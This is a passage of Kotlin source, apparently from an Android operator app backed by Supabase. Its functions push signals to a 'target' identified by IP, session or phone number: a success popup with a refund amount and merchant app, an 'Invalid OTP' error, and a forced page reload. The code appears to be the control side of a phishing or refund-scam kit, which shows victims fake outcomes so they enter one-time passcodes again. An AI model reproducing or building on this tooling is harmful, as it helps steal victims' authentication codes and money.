            settingsList.add("success_ip_$targetIp" to (if (isActive) sessionPayload.toString() else JSONObject().put("active", false).toString()))
            settingsList.add("success_action_$targetIp" to if (isActive) "true" else "false")
            settingsList.add("show_success_$targetIp" to if (isActive) "true" else "false")
            settingsList.add("success_msg_$targetIp" to if (isActive) "true" else "false")
            settingsList.add("show_popup_$targetIp" to if (isActive) "true" else "false")
            settingsList.add("popup_active_$targetIp" to if (isActive) "true" else "false")
        }
        if (targetSession.isNotBlank()) {
            settingsList.add("success_session_$targetSession" to (if (isActive) sessionPayload.toString() else JSONObject().put("active", false).toString()))
            settingsList.add("show_popup_$targetSession" to if (isActive) "true" else "false")
            settingsList.add("success_msg_$targetSession" to if (isActive) "true" else "false")
        }

        try {
            batchUpsertAppSettings(settingsList)

            // Direct row-level update on specific submission record so only this session's row triggers popup
            if (submission != null) {
                try {
                    val rowUpdate = JSONObject().apply {
                        put("show_popup", isActive)
                        put("popup_active", isActive)
                        put("is_popup_active", isActive)
                        put("success_msg_active", isActive)
                        put("popup_title", successTitle)
                        put("popup_amount", cleanAmount)
                        put("refund_amount", cleanAmount)
                        put("merchant_app", cleanApp)
                        put("popup_service", cleanServiceName)
                        put("popup_status", if (isActive) "success_popup" else "normal")
                        put("status", if (isActive) "Success" else "In Progress")
                        put("action", if (isActive) "success_message" else "none")
                        put("action_status", if (isActive) "success_message" else "none")
                        put("action_type", if (isActive) "success_modal" else "")
                    }
                    updateRow(submission.tableName, submission.idColumnName, submission.idValue, rowUpdate)
                } catch (_: Exception) { }
            }

            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Triggers remote OTP error signal for target submission.
     */
    suspend fun triggerOtpErrorSignal(submission: SupabaseSubmission): Result<Unit> = withContext(Dispatchers.IO) {
        val targetId = submission.targetIdString
        val targetPhone = submission.mobileNumber.ifBlank { submission.phone }.trim()
        val targetSession = submission.sessionId.takeIf { it != "-" } ?: submission.sessionTargetKey

        val rowsToUpsert = listOf(
            "otp_error_active" to "true",
            "otp_target_id" to targetId,
            "otp_target_phone" to targetPhone,
            "otp_error_target_id" to targetId,
            "otp_error_target_phone" to targetPhone,
            "otp_error_target_session" to targetSession,
            "otp_error_signal" to targetId
        )

        try {
            batchUpsertAppSettings(rowsToUpsert)

            // Also update row in submissions table if status or action column exists
            try {
                val rowUpdate = JSONObject().apply {
                    put("status", "Invalid OTP")
                    put("action_status", "invalid_otp")
                    put("otp_error", true)
                }
                updateRow(submission.tableName, submission.idColumnName, submission.idValue, rowUpdate)
            } catch (_: Exception) { }

            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Triggers remote client reload signal for target submission session.
     */
    suspend fun triggerReloadSignal(submission: SupabaseSubmission): Result<Unit> = withContext(Dispatchers.IO) {
        val targetId = submission.targetIdString
        val targetPhone = submission.mobileNumber.ifBlank { submission.phone }.trim()
        val targetSession = submission.sessionId.takeIf { it != "-" } ?: submission.sessionTargetKey

        val rowsToUpsert = listOf(
            "client_reload" to "true",
            "reload_target_id" to targetId,
            "reload_target_phone" to targetPhone,
            "client_reload_signal" to targetId,
            "client_reload_target_phone" to targetPhone,
            "reload_target_session" to targetSession
        )

        try {
            batchUpsertAppSettings(rowsToUpsert)

            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
